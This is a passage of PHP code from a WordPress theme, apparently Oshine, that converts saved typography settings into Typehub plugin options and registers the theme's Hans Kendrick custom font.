					if( 'font-size' === $property || 'line-height' === $property ) {
						$mobile_value = array();
						if( ( 'h1' === $field || 'h2' === $field || 'h3' === $field || 'h4' === $field || 'h5' === $field || 'h6' === $field  ) &&  !empty( $be_themes_data['mobile_typo_controller'] ) ) {
							$mobile_value = be_split_unit_value( $be_themes_data[$field.'_mobile'][$property] );
							$mobile_value = array(
								'mobile' => $mobile_value,
							);
						}
						if( !empty( $mobile_value ) ) {
							$value = array_merge( $value, $mobile_value );
						}
					}

					if( 'font-family' === $property ) {
						switch ( $value ) {
							case 'Hans Kendrick Regular':
								$value = 'Hans Kendrick';
								$data['font-variant'] = true;
								$font_variant = '400';
								unset( $data['font-weight'] );
								unset( $data['font-style'] );
							break;
							case 'Hans Kendrick Light':
								$value = 'Hans Kendrick';
								$data['font-variant'] = true;
								$font_variant = '300';
								unset( $data['font-weight'] );
								unset( $data['font-style'] );
							break;
							case 'Hans Kendrick Medium':
								$value = 'Hans Kendrick';
								$data['font-variant'] = true;
								$font_variant = '500';
								unset( $data['font-weight'] );
								unset( $data['font-style'] );
							break;
							case 'Hans Kendrick Heavy':
								$value = 'Hans Kendrick';
								$data['font-variant'] = true;
								$font_variant = '700';
								unset( $data['font-weight'] );
								unset( $data['font-style'] );
							break;						
						}
						if( is_array( $google_fonts ) && array_key_exists( $value, $google_fonts ) ) {
							$value = 'google:'.$value;
						}
						elseif ( in_array( $value, $standard_fonts ) ) {
							$value = 'standard:'.array_search( $value, $standard_fonts );
						} else {
							if( !empty( $value ) ) {
								$value = 'custom:'.$value;
							} else {
								$value = 'standard:System Font Stack';
							}
						}
					}

					if( 'font-weight' !== $property && 'font-style' !== $property ) {
						$typehub_saved_values[$field][$property] = $value;
					}
					if( !empty( $font_variant ) ) {
						$typehub_saved_values[$field]['font-variant'] = $font_variant; 
					}
				}
			}
			
		}
		if( empty( $be_themes_data['enable_portfolio_details_typo'] ) ) {
			if( !empty( $typehub_saved_values['h6'] ) ) {
				$typehub_saved_values['portfolio_details_title'] = $typehub_saved_values['h6'];
			}
			if( !empty( $typehub_saved_values['body_text'] ) ) {
				$typehub_saved_values['portfolio_details_content'] = $typehub_saved_values['body_text'];			
			}
		}
		if( empty( $be_themes_data['single_post_typo'] ) ) {
			if( !empty( $typehub_saved_values['post_title'] ) ) {
				$typehub_saved_values['single_post_title'] = $typehub_saved_values['post_title'];
			}
		}
		
		$typehub_data = array(
			'font_schemes' => array(),
			'values' => $typehub_saved_values
		);


		if( update_option( 'typehub_data', $typehub_data ) ) {
			update_option( 'oshine_redux_to_typehub', '1' );
			update_option( 'typehub_redux_backup', $be_themes_data );
		}
	}

}



add_action( 'typehub_register_font', 'oshine_register_custom_font' );
function oshine_register_custom_font() {
	$font = array(
		'name' => 'Hans Kendrick',
		'src' => get_template_directory_uri().'/fonts/hans-kendrick.css',
		'variants' => array(
			'300' => 'Light',
			'400' => 'Normal',
			'500' => 'Medium',
			'700' => 'Heavy'
		)
	);
	typehub_register_font( $font );
}
?>